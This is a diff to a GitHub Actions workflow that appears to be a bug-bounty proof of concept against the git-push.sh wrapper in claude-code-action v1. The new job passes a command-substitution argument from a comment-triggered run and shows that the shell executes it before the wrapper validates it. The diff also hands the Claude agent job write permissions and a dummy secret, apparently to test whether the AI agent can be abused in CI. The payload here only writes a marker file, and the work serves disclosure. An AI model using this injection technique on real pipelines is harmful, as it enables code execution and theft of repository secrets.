@@ -4,18 +4,87 @@ on:
   issue_comment:
     types: [created]
 
-permissions:
-  contents: write
-  issues: write
-  pull-requests: write
-  id-token: write
-
 jobs:
+  deterministic-wrapper-marker:
+    if: |
+      contains(github.event.comment.body, '@claude') &&
+      contains(github.event.comment.body, 'H1_WRAPPER_PROOF')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    env:
+      COMMENT_BODY: ${{ github.event.comment.body }}
+    steps:
+      - name: Checkout official claude-code-action v1
+        uses: actions/checkout@v4
+        with:
+          repository: anthropics/claude-code-action
+          ref: v1
+          path: official-action
+          fetch-depth: 1
+
+      - name: Public comment marker proof against official v1 wrapper
+        shell: bash
+        run: |
+          set +e
+
+          echo "trigger_actor=${GITHUB_ACTOR}"
+          echo "comment_author=${{ github.event.comment.user.login }}"
+
+          if printf '%s' "$COMMENT_BODY" | grep -qF 'git-push.sh'; then
+            echo "comment_contains_git_push_wrapper=True"
+          else
+            echo "comment_contains_git_push_wrapper=False"
+          fi
+
+          if printf '%s' "$COMMENT_BODY" | grep -qF '$('; then
+            echo "comment_contains_command_substitution=True"
+          else
+            echo "comment_contains_command_substitution=False"
+          fi
+
+          MARKER="$RUNNER_TEMP/h1-public-comment-wrapper-boundary-proof.txt"
+          rm -f "$MARKER"
+
+          printf 'before_wrapper_call=%s\n' "$(date -u +%FT%TZ)"
+
+          "$GITHUB_WORKSPACE/official-action/scripts/git-push.sh" origin "$(
+            {
+              printf 'parent_shell_executed=True\n'
+              printf 'executed_before_wrapper_validation=True\n'
+              printf 'parent_shell_executed_at=%s\n' "$(date -u +%FT%TZ)"
+            } > "$MARKER"
+          )"
+          status=$?
+
+          if [ -f "$MARKER" ]; then
+            cat "$MARKER"
+          else
+            echo "marker_file_missing=True"
+          fi
+
+          printf 'wrapper_exit=%s\n' "$status"
+          printf 'after_wrapper_return=%s\n' "$(date -u +%FT%TZ)"
+
+          if [ "$status" -ne 1 ]; then
+            echo "proof_result=unexpected_wrapper_exit"
+            exit 1
+          fi
+
+          grep -q '^parent_shell_executed=True$' "$MARKER"
+          grep -q '^executed_before_wrapper_validation=True$' "$MARKER"
+          echo "proof_result=public_comment_triggered_parent_shell_side_effect_before_wrapper_validation"
+
   claude:
     if: |
       contains(github.event.comment.body, '@claude') &&
       contains(github.event.comment.body, 'H1_WRAPPER_PROOF')
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      issues: write
+      pull-requests: write
+      id-token: write
     env:
       H1_DUMMY_SUPPLY_CHAIN_SECRET: ${{ secrets.H1_DUMMY_SUPPLY_CHAIN_SECRET }}
     steps:
